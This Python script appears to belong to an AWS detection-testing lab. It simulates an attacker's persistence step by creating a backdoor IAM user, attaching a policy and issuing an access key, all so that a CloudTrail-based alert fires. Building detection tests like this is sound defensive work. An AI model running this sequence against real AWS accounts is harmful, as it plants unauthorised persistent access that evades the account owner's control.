# scripts/attack/phase2_privilege_escalation.py
#
# Phase 2 — Privilege escalation (create a backdoor IAM identity).
# LAB ONLY. Mirrors: phase2_privilege_escalation.sh
# Exercises: detect_iam_changes()
#
# Creates a disposable user (config.BACKDOOR_USER), attaches a policy,
# and generates an access key. Cleaned up by teardown.py — this script
# does NOT delete what it creates (by design, see project decision).

import boto3

try:
    from config import PROFILE, BACKDOOR_USER, BACKDOOR_POLICY_ARN
except ImportError:
    PROFILE = "attacker"
    BACKDOOR_USER = "backdoor-svc"
    BACKDOOR_POLICY_ARN = "arn:aws:iam::aws:policy/ReadOnlyAccess"


def run_privilege_escalation(profile_name=PROFILE):
    """
    Simulates an attacker who, having gained a foothold, creates a new
    identity for persistence: CreateUser + AttachUserPolicy + CreateAccessKey.
    """
    session = boto3.Session(profile_name=profile_name)
    iam = session.client("iam")

    print(f"[*] Phase 2 — Privilege Escalation (user: {BACKDOOR_USER})")

    print("[*] CreateUser...")
    iam.create_user(UserName=BACKDOOR_USER)
    print(f"[+] Created user: {BACKDOOR_USER}")

    print(f"[*] AttachUserPolicy ({BACKDOOR_POLICY_ARN})...")
    iam.attach_user_policy(UserName=BACKDOOR_USER, PolicyArn=BACKDOOR_POLICY_ARN)
    print("[+] Policy attached")

    print("[*] CreateAccessKey...")
    key = iam.create_access_key(UserName=BACKDOOR_USER)
    print(f"[+] Access key created: {key['AccessKey']['AccessKeyId']}")

    print("[+] Phase 2 complete — check CloudTrail in ~5-15 min")
    print("    Expected: detect_iam_changes -> ALERT")
    print("    Remember: run teardown.py afterwards to remove this user.")


if __name__ == "__main__":
    run_privilege_escalation()